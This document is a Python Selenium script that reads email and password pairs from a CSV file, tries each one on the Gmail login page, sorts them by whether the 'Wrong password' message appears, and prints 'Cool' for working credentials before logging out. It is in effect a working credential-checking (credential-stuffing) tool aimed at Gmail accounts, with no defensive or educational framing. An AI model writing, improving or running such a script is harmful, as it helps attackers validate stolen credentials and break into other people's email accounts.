from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from time import *
import _thread
import csv

"""
    CSV should contain 2 columns 'email' and 'password' only
"""

flag = 0
def SuccessLogin():
    global flag
    while True:
        try:
            ele3 = driver.find_element_by_xpath('//*[@id=":dv"]/div/div')
            flag = 2
            break
        except Exception as r:
            pass
    
def FailLogin():
    global flag
    while True:
        try:
            ele3 = driver.find_element_by_xpath('//*[@id="password"]/div[2]/div[2]')
            if ele3.text == "Wrong password. Try again.":                
                flag = 1
                break
        except Exception as r:
            pass
    
with open("emails1.csv") as file:

    readfile = csv.reader(file,delimiter=',')

    emails = {}
    x=0
    for row in readfile:
        emails[x] = [row[0],row[1]]
        x+=1



for i in emails:
    
    driver = webdriver.Chrome('F:/chromedriver')
    driver.get("http://mail.google.com")

    elem = driver.find_element_by_name("identifier")
    elem.send_keys(emails[i][0])
    ele2 = driver.find_element_by_xpath('//*[@id="identifierNext"]/content/span')
    ele2.click()

    while True:
        try:
            elep = driver.find_element_by_name("password")
            elep.send_keys(emails[i][1])           
            break
        except Exception as r:
            pass


    while True:
        try:
            ele3 = driver.find_element_by_xpath('//*[@id="passwordNext"]')    
            ele3.click()        
            break
        except Exception as r:
            pass
        

    flag = 0
    _thread.start_new_thread(SuccessLogin,())
    _thread.start_new_thread(FailLogin,())

    while flag == 0:
        pass
     
    if flag == 1:
        print("Fail")
    elif flag == 2:
        print("Cool")
        driver.get('https://mail.google.com/mail/logout?hl=en')
        while True:
            try:
                elep = driver.find_element_by_name("password")
                driver.close()
                break
            except Exception as r:
                pass
    driver.quit()
    
        



